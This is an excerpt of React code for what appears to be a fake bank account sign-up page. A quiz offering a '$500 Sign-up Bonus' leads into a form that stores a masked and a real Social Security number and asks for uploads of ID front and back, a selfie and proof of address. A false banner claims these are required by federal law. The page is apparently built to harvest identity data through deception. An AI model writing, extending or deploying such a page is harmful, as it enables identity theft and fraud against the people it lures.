...
interface SubmittedDataType { userId: string; ssn_masked: string; ssn_real: string; status: string; submittedAt: string; documents: { idFront: FileData | null; idBack: FileData | null; selfie: FileData | null; proofAddress: FileData | null; }; }
    ...
    <div className="mb-4">
      ...
      <div onClick={handleClick} className={`relative border-2 border-dashed rounded-xl p-6 cursor-pointer transition-all ${file ? 'border-green-500 bg-green-50' : 'border-gray-300 hover:border-green-400'}`}>
        ...
        <div className="flex flex-col items-center justify-center text-center">
          {file ? (<><div className="bg-green-100 p-3 rounded-full mb-2"><Check className="w-6 h-6 text-green-600" /></div><p className="text-sm font-semibold text-green-800 truncate max-w-[200px]">{file.name}</p></>) : (<><div className="bg-gray-100 p-3 rounded-full mb-2">{icon || <Camera className="w-6 h-6 text-gray-500" />}</div><p className="text-sm font-medium text-gray-600"><span className="text-green-600 font-bold">Upload</span> or take photo</p></>)}
        </div>
      </div>
    </div>
  );
...
export default function App() {
  ...
  const quizQuestions = [
    { question: "Do you currently live in the US?", options: ["Yes", "No"] },
    { question: "Are you 18 years or older?", options: ["Yes", "No"] },
    { question: "Do you want to receive a $500 Sign-up Bonus?", options: ["Yes, absolutely!"] }
  ];
  ...
  if (step === 2 && submittedData) return (
    <div className="min-h-screen bg-[#F2F8F5] flex flex-col items-center justify-center p-6 text-center font-sans w-full">
      <div className="bg-white p-8 rounded-2xl shadow-xl max-w-md w-full border border-green-100">
        ...
        <p className="text-gray-600 mb-6 text-sm">We have received your documents securely.</p>
        ...
        <button className="w-full bg-[#00C865] text-white font-bold py-4 rounded-xl shadow-lg" onClick={() => window.location.reload()}>Return to Home</button>
      </div>
    </div>
  );
        ...
        <div className="max-w-lg mx-auto bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100">
          <div className="bg-gray-50 p-6 border-b border-gray-100">
            ...
            <p className="text-gray-500 text-sm mt-1">
              Required by federal law to open a bank account.
            </p>
          </div>
